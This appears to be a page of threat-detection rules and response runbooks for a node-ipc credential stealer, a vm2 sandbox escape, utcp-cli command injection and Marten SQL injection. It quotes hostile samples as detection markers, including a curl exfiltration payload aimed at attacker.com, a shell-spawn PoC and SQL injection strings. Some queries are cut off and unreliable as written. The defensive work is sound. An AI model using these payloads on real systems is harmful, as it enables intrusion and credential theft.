Outbound egress to node-ipc stealer infrastructure (azurestaticprovider[.]net / 37.16.75.69) AIActions on Objectives High
Detects network connections to attacker-owned exfiltration infrastructure used by the malicious node-ipc 9.1.6 / 9.2.3 / 12.0.1 npm packages published 14 May 2026. Any host reaching these atoms after package install should be treated as a credential-theft incident. Rationale: Pivots on two atomic IOCs explicitly named in the Snyk advisory (37.16.75.69 and azurestaticprovider.net), each independently corroborated by StepSecurity and Upwind. No expected legitimate traffic to either atom — attacker-owned exfil infrastructure. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft • https://thehackernews.com/2026/05/stealer-backdoor-found-in-3-node-ipc.html
ATT&CKT1041 T1071.001 T1195.002
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Researcher / red-team sandbox intentionally detonating a node-ipc IOC sample
  • Threat-intel platform validating IOC reachability from an enrichment sensor
  • Internal honeypot or canary host instrumented to call known-bad domains for SOC training
  • DNS-over-HTTPS resolver logs caching previous lookups when no real connection was made
Suppression filter
| where not (DeviceName has_any ("sandbox","detonator","sentinel-ti-","honeypot") or InitiatingProcessFileName in~ ("thor.exe","loki.exe"))
Response runbook
Step 1 (triage): On any hit, immediately enumerate the initiating process tree (InitiatingProcessFileName + parent) — confirm whether the originating process is node.exe / node and which package directory was loaded. Pull `npm ls node-ipc` and lockfile contents from the host. Step 2 (contain): Isolate the device, block 37.16.75.69 and *.azurestaticprovider.net at egress, kill the offending node process, and revoke ALL credentials accessible from that environment (npm tokens, GitHub PATs, AWS keys, SSH, kubeconfig, GCP service accounts, Terraform state, shell-history-resident secrets). Step 3 (hunt): Pivot on the firing host's outbound connections for the prior 7 days to surface staging/recon connections; sweep CI runners and developer laptops for the affected node-ipc versions and for the related UCs (DNS lookups, __ntw=1 marker, nt-* temp dirs).

| where RemoteIP == "37.16.75.69"
   or RemoteUrl has_any ("azurestaticprovider.net","sh.azurestaticprovider.net")
| project Timestamp, DeviceName, RemoteIP, RemotePort, RemoteUrl, Protocol,

| order by TimeGenerated desc

DNS lookup for azurestaticprovider[.]net node-ipc exfil domain AICommand & Control High
Surfaces hosts resolving the attacker-controlled domain azurestaticprovider.net (or sh.azurestaticprovider.net) used by the malicious node-ipc payload, even when the subsequent TCP egress is firewall-blocked. DNS-layer pivot catches hosts that loaded the package but did not complete exfiltration. Rationale: DNS pivot catches the same campaign at an earlier layer than TCP egress and survives proxy-level blocks. Domain is unique to this campaign and referenced verbatim in StepSecurity, Upwind, and Snyk advisories. ContextImageFileName lets the analyst confirm node.exe / npm as the requesting process. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1071.004 T1041
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment sensor doing IOC reachability checks
  • DNS server forwarding cache-warmup queries from another resolver
  • Security researcher / SOC analyst running curl/dig from a jump host
  • RPZ logging shows blocked queries — confirms detection efficacy, not malicious activity
Suppression filter
| where not (DeviceName has_any ("ti-enrich-","sandbox-","honeypot-"))
Response runbook
Step 1 (triage): Identify the requesting process via ContextImageFileName / InitiatingProcessFileName — confirm node.exe / npm / yarn / pnpm as parent and pull the host's package-lock.json for node-ipc versions 9.1.6 / 9.2.3 / 12.0.1. Step 2 (contain): Sinkhole or RPZ-block *.azurestaticprovider.net at the resolver, isolate any developer/CI host where the lookup originated, rotate all credentials reachable from that environment (npm, GitHub, AWS, SSH, kube, Terraform state, GCP). Step 3 (hunt): Cross-reference against UC1 (TCP egress) to see whether exfiltration completed; if no TCP follow-on the credentials may still be unexposed — but assume compromise. Sweep the org for additional node-ipc installs via npm/yarn/pnpm lockfile inventory.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "azurestaticprovider.net"
   or RemoteUrl endswith ".azurestaticprovider.net"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Hits=count(),
            SampleProc=any(InitiatingProcessFileName),
            SampleCmd=any(InitiatingProcessCommandLine),
            SampleUser=any(InitiatingProcessAccountName)
            by DeviceName, RemoteUrl
| order by FirstSeen asc
union isfuzzy=true
(DnsEvents
 | where TimeGenerated > ago(30d)
 | where Name has "azurestaticprovider.net"
 | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
(ImDnsActivity
 | where TimeGenerated > ago(30d)
 | where DnsQuery has "azurestaticprovider.net"
 | project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DnsQuery, DnsResponseName, DnsResponseCodeName, EventProduct)

node-ipc stealer __ntw=1 environment marker in process command line AIInstallation High
Hunts for the __ntw=1 environment-variable marker reportedly used by the malicious node-ipc payload to signal that a child has already inherited the stealer context (preventing re-entry). Presence of this token in any process or child command-line is a high-fidelity indicator the payload executed on the host. Rationale: `__ntw=1` is a campaign-specific environment marker called out verbatim in the Snyk advisory and corroborated by StepSecurity — no mainstream npm package or build tool uses this token. Single-string match on CommandLine works because env vars set inline (e.g. `__ntw=1 node ...`) and parent-spawned children with that prefix surface in EDR command-line telemetry. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1059.007 T1027 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher / IR analyst reproducing the malware on a sandbox
  • Internal threat-hunt query stored in an analyst's shell history that gets re-exec'd
  • Sigma/test harness firing a synthetic event with the literal IOC for tuning
  • Documentation file or README opened in an editor whose telemetry surfaces __ntw=1 in the process arglist of a grep/findstr
Suppression filter
| where not (DeviceName has_any ("sandbox-","detonator-","malware-rev-") or InitiatingProcessFileName in~ ("grep.exe","findstr.exe","rg.exe","sigma-cli"))
Response runbook
Step 1 (triage): Pull the full process tree around the hit — parent (likely node.exe / npm / yarn / pnpm), command line, and SHA256. Confirm whether node_modules/node-ipc/node-ipc.cjs exists on the host and what version is recorded in package-lock.json or yarn.lock. Step 2 (contain): Isolate the host, kill the node process tree, quarantine the affected package directory, and rotate every credential category named in the advisory (npm, GitHub PAT/SSH, AWS / Azure / GCP, kubeconfig, Terraform state, ~/.bash_history-resident secrets, AI/dev-tool API keys). Step 3 (hunt): Sweep all hosts in the org for the same IOC, then pivot to UC1/UC2 (egress + DNS) for the same host's prior 7 days to confirm exfiltration completion.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "__ntw=1"
   or InitiatingProcessCommandLine has "__ntw=1"
| project Timestamp, DeviceName, AccountName,
          FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
 | where TimeGenerated > ago(30d)
 | where ActingProcessCommandLine has "__ntw=1"
    or ParentProcessCommandLine has "__ntw=1"
    or TargetProcessCommandLine has "__ntw=1"
 | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine, TargetProcessCommandLine, EventProduct),
(SecurityEvent
 | where TimeGenerated > ago(30d)
 | where EventID == 4688
 | where CommandLine has "__ntw=1" or ParentProcessName has "__ntw=1"
 | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName, ProcessId)
| order by TimeGenerated desc

Malicious node-ipc package landed on disk under node_modules AIDelivery Medium
Hunts for file-system writes of node-ipc.cjs into any node_modules/node-ipc/ directory after the 14 May 2026 publication window, surfacing developer workstations, CI runners, build containers, and artifact registries that installed a candidate-malicious release. Pair with version triage (9.1.6 / 9.2.3 / 12.0.1). Rationale: Anchors on the exact CommonJS file Snyk identifies as malicious (`node-ipc.cjs`) and the canonical install path (`node_modules/node-ipc/`). Time-bound to the publication window so analysts only see installs that could be the bad versions. Hunting tier because a hit alone does not prove the version is malicious — needs package.json/lockfile triage as Step 1. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft • https://thehackernews.com/2026/05/stealer-backdoor-found-in-3-node-ipc.html
ATT&CKT1195.002 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer installing a still-uncompromised legacy version (e.g. 12.0.0) after the cutoff
  • CI cache warmup writing node-ipc into a build container from a private mirror with safe versions
  • Docker image layer-extraction surfacing node-ipc.cjs writes from older base images
  • Local node_modules vendoring during yarn/pnpm migrations (massive file-create bursts that include node-ipc)
Response runbook
Step 1 (triage): Read the sibling `package.json` (`FolderPath/../package.json`) on each host and confirm version. Versions 9.1.6, 9.2.3, 12.0.1 = malicious; anything else = downgrade or pin. Step 2 (contain): On confirmed malicious version — isolate the host, delete the affected node_modules tree, clear the npm/yarn/pnpm cache, refresh the lockfile pinning to a safe version, and treat all credentials accessible from that environment as exposed. Step 3 (hunt): Inventory ALL artifact registries (Artifactory, Nexus, internal npm proxy), CI cache volumes, ephemeral build worker images, and Docker layers for the same file; pivot to UC1/UC2/UC3 on each candidate host.
DeviceFileEvents
| where Timestamp >= datetime(2026-05-14T00:00:00Z)
| where ActionType in ("FileCreated","FileModified")
| where FileName =~ "node-ipc.cjs"
| where FolderPath has "node_modules" and FolderPath has "node-ipc"
| project Timestamp, DeviceName, FolderPath, FileName, FileSize, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, InitiatingProcessFolderPath
| order by Timestamp asc
ImFileEvent
| where TimeGenerated >= datetime(2026-05-14T00:00:00Z)
| where EventType in ("FileCreated","FileModified","FileCreate")
| where TargetFileName =~ "node-ipc.cjs"
| where TargetFilePath has "node_modules" and TargetFilePath has "node-ipc"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSize, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine, EventProduct
| order by TimeGenerated asc

node.js process staging credential dump in nt-* temp directory AIActions on Objectives Medium
Detects the staging artefact the malicious node-ipc payload writes — a temp directory matching `$TMPDIR/nt-*` populated by a node process — used to compress harvested SSH / cloud / kube / GitHub / Terraform / shell-history credentials before exfil. Catches the campaign at the collection layer even if egress is firewall-blocked. Rationale: Combines two campaign-specific behaviours from the Snyk advisory: (a) the temp directory prefix `nt-` and (b) a node process as the writer. Threshold of ≥3 distinct files per directory suppresses single-file noise while still firing on the credential-dump fan-out (90+ categories). Catches the campaign at the collection step even when egress is blocked. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1074.001 T1552.001 T1560.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Node.js test framework (e.g. some Jest/Mocha snapshot tooling) writing nt-prefixed scratch files
  • Node.js native build (node-gyp) using temp scratch directories during compile
  • Electron app's installer/updater extracting nt-prefixed temp artefacts on Windows
  • A developer running a CLI tool whose temp prefix happens to begin with 'nt'
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("node-gyp","electron-builder","jest","mocha") or InitiatingProcessParentFileName in~ ("npm.exe","yarn.exe","pnpm.exe") and DistinctFiles < 10)
Response runbook
Step 1 (triage): Pull the file inventory inside the matching nt-* directory — confirm presence of files resembling credential artefacts (id_rsa, .aws/credentials, kubeconfig, .gitconfig, .npmrc, .terraformrc, .bash_history). Check the writing process tree for node-ipc on disk. Step 2 (contain): Kill the node process, isolate the host, preserve the nt-* directory for forensics, and rotate every credential the host had access to (treat as fully compromised; the staging dir confirms collection occurred). Step 3 (hunt): Pivot to UC1/UC2 (azurestaticprovider.net + 37.16.75.69 egress) on the same host to determine whether the stage was exfiltrated; sweep CI runners for the same staging pattern.
DeviceFileEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("node.exe","node")
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath matches regex @"(?i)([\\/]Temp[\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
            DistinctFiles=dcount(FileName), SampleFiles=make_set(FileName, 25),
            TotalBytes=sum(FileSize)
            by DeviceName, InitiatingProcessAccountName, InitiatingProcessFolderPath, FolderPath
| where DistinctFiles >= 3
| order by FirstSeen asc
ImFileEvent
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("node.exe","node")
| where EventType in ("FileCreated","FileModified")
| where TargetFilePath matches regex @"(?i)([\\/]Temp[\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)"
| summarize FirstSeen=min(TimeGenerated), DistinctFiles=dcount(TargetFileName),
            SampleFiles=make_set(TargetFileName, 25), TotalBytes=sum(TargetFileSize)
            by DvcHostname, ActorUsername, TargetFilePath, EventProduct
| where DistinctFiles >= 3
| order by FirstSeen asc
title: Node.js Process Writes to nt-* Temp Directory (node-ipc Stealer Staging)
id: f0c5e842-9a16-4a3d-b71e-2c0d8e5fa317
description: Detects a Node.js process creating files in a temp directory matching the nt-* prefix reportedly used by the malicious node-ipc 9.1.6 / 9.2.3 / 12.0.1 payload to stage harvested credentials before exfiltration.
references:
  - https://snyk.io/blog/malicious-node-ipc-versions-published-npm/
  - https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack
author: SOC Detection Engineering
date: 2026/05/19
tags:
  - attack.collection
  - attack.t1074.001
  - attack.credential_access
  - attack.t1552.001
logsource:
  category: file_event
detection:
  selection_image:
    Image|endswith:
      - '\node.exe'
      - '/node'
  selection_path:
    TargetFilename|contains:
      - '\Temp\nt-'
      - '/tmp/nt-'
      - '/T/nt-'
  condition: selection_image and selection_path
falsepositives:
  - Legitimate Node.js tooling that happens to use an nt- prefix for scratch files (rare)
level: medium

(source:windows.sysmon @EventID:11 @Image:(*\\node.exe OR *\\Node.exe) (@TargetFilename:*\\Temp\\nt-* OR @TargetFilename:*\\AppData\\Local\\Temp\\nt-*)) OR (source:linux.auditd @process.name:node (@file.path:/tmp/nt-* OR @file.path:/var/folders/*/T/nt-*))
#event_simpleName=FileWritten
| ContextImageFileName=/[\\\\/]node(\\.exe)?$/i
| regex("([\\\\/]Temp[\\\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)", field=TargetFileName, flags=i)
| groupBy([aid, ComputerName, UserName, ContextImageFileName], function={
    distinct_count := count(field=TargetFileName, distinct=true)
  })
| distinct_count >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_name) as files dc(Filesystem.file_name) as file_count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\Temp\\nt-*" OR Filesystem.file_path="*/tmp/nt-*" OR Filesystem.file_path="*/var/folders/*/T/nt-*") AND Filesystem.process_name IN ("node.exe","node") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)` | where file_count >= 3 | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_name) as files dc(Filesystem.file_name) as file_count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\Temp\\nt-*" OR Filesystem.file_path="*/tmp/nt-*" OR Filesystem.file_path="*/var/folders/*/T/nt-*") AND Filesystem.process_name IN ("node.exe","node") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)` | where file_count >= 3 | convert ctime(firstTime) ctime(lastTime)

The vm2 sandbox is widely embedded in AI/LLM agent backends, low-code platforms, and form-evaluator services to run untrusted JS — locating instances <= 3.11.2 is the prerequisite for prioritising patching against this async-generator escape. Rationale: Path-string `node_modules/vm2/package.json` is the unambiguous file-system footprint of the affected library (CVE only impacts the npm vm2 package). TVM coverage of npm packages is uneven on Windows, so combine TVM with a file-event hunt. Cross-checked against the GHSA advisory and Semgrep/Endor Labs corroboration. Cross-checked against: • https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24 • https://nvd.nist.gov/vuln/detail/CVE-2026-45411 • https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox/ • https://www.bleepingcomputer.com/news/security/critical-vm2-sandbox-bug-lets-attackers-execute-code-on-hosts/
ATT&CKT1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer workstations with cached node_modules from old projects pinning vm2 < 3.11.3
  • CI/CD build agents that pull dependency trees including legacy vm2
  • Container images baked with affected version still in registry but not yet rebuilt
  • Penetration test rigs / security-research VMs intentionally hosting vulnerable vm2
Suppression filter
| where InitiatingProcessFileName !in~ ("npm.exe", "npm-cli.js", "yarn.exe", "pnpm.exe", "node.exe") or InitiatingProcessCommandLine has_any ("install", "ci", "add")
Response runbook
1) Triage: identify the parent application/service that owns the node_modules tree (check the directory above node_modules and the running node.exe parent service). Pull the `version` field from package.json — if > 3.11.2 the host is safe. 2) Contain: for any internet-exposed or untrusted-code-evaluating service running vm2 <= 3.11.2, upgrade to 3.11.3+ or migrate to isolated-vm; if patching is blocked, temporarily block child_process at the Node.js policy/CapabilityToken layer or place the service behind a non-routable interface. 3) Hunt: pivot to UC#2 (node spawning shell utilities) over the past 30 days on the same host to confirm whether the vulnerability has already been exercised.

Node.js process spawning shell or system utility — likely vm2 sandbox escape AIExploitation High
Detects node.exe / node spawning cmd/powershell/sh/bash/touch — the post-escape behaviour shown in the CVE-2026-45411 PoC (`child_process.execSync('touch pwned')`). Server-side Node services that legitimately sandbox untrusted JS via vm2 should not be shelling out; any child-process spawn under such a service after exploit is a high-confidence RCE signal. Rationale: PoC literally invokes `require('child_process').execSync('touch pwned')` after the async-generator escape — `touch`, plus the broader shell/system-utility set, is exactly what an attacker reaches for next. node→shell is rare in production server workloads that exist specifically to sandbox untrusted JS; multiple vendor write-ups (Semgrep, Kodem, Endor Labs) confirm `child_process` spawning from node is the canonical post-vm2-escape behavioural signal. Cross-checked against: • https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24 • https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox/ • https://www.kodemsecurity.com/resources/vm2-sandbox-escape-vulnerabilities-the-2026-cve-wave-turning-ai-agents-into-host-rce-vectors • https://www.endorlabs.com/learn/cve-2026-22709-critical-sandbox-escape-in-vm2-enables-arbitrary-code-execution
ATT&CKT1059 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Build/CI node tooling (gulp/grunt/webpack) legitimately exec'ing sub-processes during build
  • DevOps node scripts orchestrating shell commands (e.g. shelljs, execa) on automation servers
  • Node-based test runners spawning headless browsers / db clients
  • Electron-style desktop apps where node is the renderer parent (different process model)
  • Custom internal CLIs implemented in Node that wrap system utilities like curl/whoami
Suppression filter
| where InitiatingProcessParentFileName !in~ ("npm.exe","yarn.exe","pnpm.exe","corepack.exe") and InitiatingProcessCommandLine !has_any ("node_modules\\webpack","node_modules\\gulp","node_modules\\grunt","node_modules\\jest","node_modules\\mocha","--build","--ci")
Response runbook
1) Triage: pivot to InitiatingProcessCommandLine — is the parent a known dev/build tool (npm, yarn, webpack, gulp) or an internet-facing service (Express, Next.js, NestJS, LangChain agent, low-code form evaluator)? Pull the command line of the spawned child; benign tools usually invoke version-checks (`node --version`, `git rev-parse`), exploits invoke recon (`whoami`, `id`, `uname -a`) or staging (`curl`, `wget`, `touch`). 2) Contain: if the parent is an untrusted-code-evaluator (vm2, isolated-vm, AI/LLM agent runtime), isolate the host and snapshot for IR; rotate any credentials/tokens accessible to that service's process identity. 3) Hunt: search DeviceFileEvents on the same host for vm2 package.json (UC#1) and check DeviceNetworkEvents for outbound connections from the same node PID within ±5 minutes of the child spawn.

utcp-cli command injection via UTCP_ARG substitution in python→bash -c CMD_N_OUTPUT script AIExploitation High
Detects exploitation of CVE-2026-45369 in utcp-cli ≤ 1.1.1 where a Python parent process spawns /bin/bash -c with the library's signature `CMD_<N>_OUTPUT=$(<cmd> 2>&1)` script template containing unescaped shell metacharacters that indicate injected commands chained after the placeholder. Article-specific: only utcp-cli generates this exact variable-assignment-via-command-substitution pattern, so any presence of `;`, backticks, nested `$()`, pipe-to-shell, or known-bad LOLBins inside the body strongly implies a tool_args injection. Rationale: Built around the exact script template `CMD_<N>_OUTPUT=$(<cmd> 2>&1)` shown in the GHSA's vulnerable-code excerpt — this string only exists in utcp-cli's `_substitute_utcp_args` output. Combined with a python parent → /bin/bash -c (or powershell.exe -Command) child and shell-metacharacter markers from the PoC payload (`; curl http://attacker.com/$(cat /etc/passwd | base64)`), the signature is highly specific to exploitation rather than benign utcp-cli usage. Corroborated against the official UTCP CLI protocol docs (utcp.io/protocols/cli) which confirm the `CMD_N_OUTPUT` and `UTCP_ARG_..._UTCP_END` placeholder semantics. Cross-checked against: • https://github.com/advisories/GHSA-33p6-5jxp-p3x4 • https://www.utcp.io/protocols/cli • https://github.com/universal-tool-calling-protocol/python-utcp • https://pypi.org/project/utcp/

title: utcp-cli Command Injection via UTCP_ARG Placeholder Substitution (CVE-2026-45369)
id: 6f8d4e2a-1c9b-4d3f-9a7e-7b3a5c8f1d44
status: experimental
description: |
  Detects exploitation of CVE-2026-45369 in utcp-cli <= 1.1.1. The library generates
  shell scripts of the form `CMD_<N>_OUTPUT=$(<command> 2>&1)` and executes them via
  /bin/bash -c. Unescaped attacker-controlled tool_args allow shell metacharacters
  (;, $(), `, |) to break out of the intended command. This rule fires on a python
  parent spawning bash where the command line carries both the utcp-cli script
  signature and metacharacters indicative of injection.

  - https://www.utcp.io/protocols/cli

Vulnerable utcp-cli package (<= 1.1.1) inventory hunt for CVE-2026-45369 AIReconnaissance High
Identifies hosts with utcp-cli at vulnerable versions (≤ 1.1.1, fixed in 1.1.2) so SOC can drive patching ahead of exploitation. Article-specific because the fix is a precise minor-version bump and the affected package name is unique to the Universal Tool Calling Protocol Python CLI plugin. Rationale: Anchored to the exact patched version stated in the advisory (`utcp-cli >= 1.1.2`) and the unique package name. The Defender TVM and Sentinel TVM tables give authoritative inventory; the auxiliary process-cmdline branch covers hosts running utcp-cli inside venvs that TVM may not have catalogued. Sigma is omitted because vulnerability-inventory detection is not a single-event-shape process-creation rule. Corroborated against the package's PyPI page and the official UTCP project repo, which confirm the version line and CLI plugin location matches `plugins/communication_protocols/cli/`. Cross-checked against: • https://github.com/advisories/GHSA-33p6-5jxp-p3x4 • https://pypi.org/project/utcp/ • https://github.com/universal-tool-calling-protocol/python-utcp

Marten CVE-2026-45288 regConfig SQL injection attempt in web traffic AIExploitation High
Detects HTTP requests carrying the high-fidelity Marten full-text-search regConfig SQL injection signature. The PostgreSQL `::regconfig` type-cast literal, `to_tsvector('` fragment, and DDL/DML targeting Marten's `mt_doc_*` document tables are essentially never present in benign user input, making this near-zero-FP exploitation telemetry. Rationale: The `::regconfig` PostgreSQL type-cast literal is the exact fragment Marten's `FullTextWhereFragment.cs` interpolates around the user-supplied regConfig value (per the patched source and PR #4343). It cannot appear in legitimate URL query strings because no client UI emits a PostgreSQL type cast. Paired with `to_tsvector('`, `pg_sleep(`, and the Marten-specific `mt_doc_` table prefix, this is near-zero-FP exploitation telemetry. Corroborated against the canonical advisory and Marten source. Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://github.com/JasperFx/marten/pull/4343 • https://github.com/JasperFx/marten/blob/master/src/Marten/Linq/SqlGeneration/Filters/FullTextWhereFragment.cs
ATT&CKT1190 T1059
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized internal penetration test or DAST scan (Burp, sqlmap) running CVE-2026-45288 payloads against your own app
  • Security research / threat-intel team replaying the public PoC in a staging environment
  • WAF / vendor security scanner emitting the payload as part of its baseline test suite
  • Developer pasting the GHSA advisory text into a search field that is logged verbatim (low likelihood)
Suppression filter
| where ClientIP !in (dynamic(["<allowlisted-pentest-IP-1>", "<dast-scanner-IP-2>"]))
| where UA !has_any ("sqlmap", "Burp", "nuclei", "acunetix", "qualys")  // optionally — remove to keep these in scope when they're external
Response runbook
1. Triage: pivot on ClientIP to check WAF block status and historical reputation; pull the full request body and response status — a 500 with PostgreSQL error noise or a 200 with anomalous response time (>5s for `pg_sleep(5)`) indicates the injection reached the DB. Map the target Host/Url back to a known Marten-backed application and its Marten version. 2. Contain: block the source IP at WAF/CDN, terminate any active app sessions from that source, and if the affected app is still on Marten <= 8.36, deploy the workaround (regConfig allowlist or hard-code) at the application boundary until patch. 3. Hunt: query DB audit logs for `to_tsvector('` calls in the request window (see UC3), check `pg_stat_statements` for unexpected `pg_sleep` / `SELECT version` / DDL against `mt_doc_*` tables, and look for follow-on credential-access or data-exfil queries from the same app-pool DB role.
let LookbackDays = 7d;
let SqliMarkers = dynamic(["::regconfig", "%3A%3Aregconfig", "%3a%3aregconfig", "pg_sleep(", "DROP TABLE mt_doc_", "drop table mt_doc_", "to_tsvector('", "'; SELECT version", "'::text);"]);
union isfuzzy=true
  (W3CIISLog
    | where TimeGenerated > ago(LookbackDays)
    | where csUriQuery has_any (SqliMarkers) or csUriStem has_any (SqliMarkers)
    | extend SourceTable = "W3CIISLog",
             ClientIP = cIP,
             Url = strcat(csUriStem, "?", csUriQuery),
             UA = csUserAgent,
             Host = sSiteName,
             Status = tostring(scStatus)),
  (AppServiceHTTPLogs
    | where TimeGenerated > ago(LookbackDays)
    | where CsUriQuery has_any (SqliMarkers) or CsUriStem has_any (SqliMarkers)
    | extend SourceTable = "AppServiceHTTPLogs",
             ClientIP = CIp,
             Url = strcat(CsUriStem, "?", CsUriQuery),
             UA = UserAgent,
             Host = CsHost,
             Status = tostring(ScStatus)),
  (CommonSecurityLog
    | where TimeGenerated > ago(LookbackDays)
    | where RequestURL has_any (SqliMarkers) or RequestContext has_any (SqliMarkers)
    | extend SourceTable = strcat(DeviceVendor, "/", DeviceProduct),
             ClientIP = SourceIP,
             Url = RequestURL,
             UA = RequestClientApplication,
             Host = DestinationHostName,
             Status = tostring(EventOutcome))
| project TimeGenerated, SourceTable, Host, ClientIP, Url, UA, Status
| order by TimeGenerated desc

Vulnerable Marten library (CVE-2026-45288) present on host — proactive exposure hunt AIReconnaissance Medium
Hunting query that identifies hosts running a vulnerable Marten NuGet library (<= 8.36) so the SOC can scope CVE-2026-45288 exposure and drive patching to 8.36.1+. Combines Defender TVM vulnerability data with on-disk Marten.dll discovery for hosts that TVM doesn't enumerate (build agents, dev workstations, self-hosted .NET app servers). Rationale: Marten is distributed as `Marten.dll` (the canonical NuGet artifact name) and is the only library exposing the vulnerable `FullTextWhereFragment` SQL builder. Microsoft's TVM does not consistently inventory NuGet packages, so the FileEvent/FileWritten fallback catches build agents and self-hosted .NET app servers that wouldn't show up in `DeviceTvmSoftwareVulnerabilities`. SOC pivot: once a host hits, manually confirm version via the application's `*.deps.json` / `packages.lock.json` (the file lookup doesn't include version metadata). Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://www.nuget.org/packages/Marten

Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer workstations with Marten source clones or sample apps (legitimate but should be tracked)
  • CI build agents that pull Marten as a transitive dependency for short-lived test jobs
  • Hosts running Marten 8.36.1+ (patched) where Marten.dll exists but is NOT vulnerable — must check version
  • Decommissioned app servers with stale Marten.dll files no longer in production use
Suppression filter
| where DeviceName !endswith "-dev" and DeviceName !endswith "-build"  // optional: scope out known dev / CI fleet during initial triage; remove for full sweep
Response runbook
1. Triage: for each hit, identify the parent .NET application (look at the FolderPath — typically `<app>\bin\<framework>\Marten.dll`) and confirm Marten version by reading the adjacent `<app>.deps.json` or `packages.lock.json`. Vulnerable: Marten <= 8.36. 2. Contain: for any app surfacing the `regConfig` parameter to untrusted input (review controller / minimal-API endpoints for `?lang=`, `?regConfig=`, or model-bound full-text-search calls), deploy the workaround at the application boundary (regex allowlist `^[a-zA-Z_][a-zA-Z0-9_]*(\.[a-zA-Z_][a-zA-Z0-9_]*)?$`) until upgrade. 3. Hunt: schedule patch to 8.36.1+; pivot UC1 web-log queries against the application's hostname for the prior 30 days to check for exploitation that pre-dates this discovery.

let FileHits = DeviceFileEvents

union TvmHits, FileHits
| order by Timestamp desc

Marten CVE-2026-45288 injection observed executing in PostgreSQL audit log AIExploitation High
Detects PostgreSQL server-side log entries that contain the Marten full-text-search SQL signature (`to_tsvector('`) interleaved with attacker-injected payloads (`pg_sleep(`, DDL against `mt_doc_*`, appended SELECT statements). This catches successful exploitation that reached the DB, including via app paths that don't traverse the perimeter WAF. Rationale: Per the GHSA advisory and patched `FullTextWhereFragment.cs`, every Marten full-text-search call emits SQL of shape `to_tsvector('<regConfig>'::regconfig, <data>) @@ ...('<regConfig>'::regconfig, ?)`. The verbatim `to_tsvector('` plus the article's PoC payload fragments (`pg_sleep`, `DROP TABLE mt_doc_`, `'::text);`) in the same log line means the injection successfully reached PostgreSQL's parser. The `mt_doc_` document-table prefix is specific to Marten's storage convention (corroborated via Marten's own full-text-index integration tests). Defender XDR and Falcon FDR do not ingest PostgreSQL server logs so those fields are empty. Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://github.com/JasperFx/marten/pull/4343 • https://github.com/JasperFx/marten/blob/master/src/DocumentDbTests/Indexes/full_text_index.cs
ATT&CKT1190 T1059
Data sources
